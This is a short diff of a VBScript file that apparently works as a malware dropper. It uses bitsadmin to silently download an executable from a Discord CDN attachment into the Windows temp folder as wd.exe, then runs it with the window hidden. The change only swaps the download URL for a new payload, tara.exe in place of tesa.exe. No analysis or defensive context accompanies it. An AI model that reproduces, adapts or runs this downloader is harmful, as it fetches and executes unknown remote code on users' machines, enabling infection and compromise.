@@ -5,7 +5,7 @@ Dim shell: Set shell = CreateObject("WScript.Shell")
 Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")
 Dim temp: temp = fso.GetSpecialFolder(2)
 
-shell.Run "bitsadmin /transfer d /download /priority high ""https://cdn.discordapp.com/attachments/1546189222036111414/1551084872796471296/tesa.exe?ex=6ab0afdb&is=6aaf5e5b&hm=10fbd9f0c55ec66be7d7ecb6f0ec09e7e96b150120a2a0490e76ff2b7a9383a3&"" """ & temp & "\wd.exe""", 0, True
+shell.Run "bitsadmin /transfer d /download /priority high ""https://cdn.discordapp.com/attachments/1546189222036111414/1551085360312750190/tara.exe?ex=6ab0b04f&is=6aaf5ecf&hm=d61df2a2f44720a564d9d9cc88983ddcb513280031cfa6b61b6f3267beb71009&"" """ & temp & "\wd.exe""", 0, True
 
 If fso.FileExists(temp & "\wd.exe") Then
     shell.Run """" & temp & "\wd.exe""", 0, False
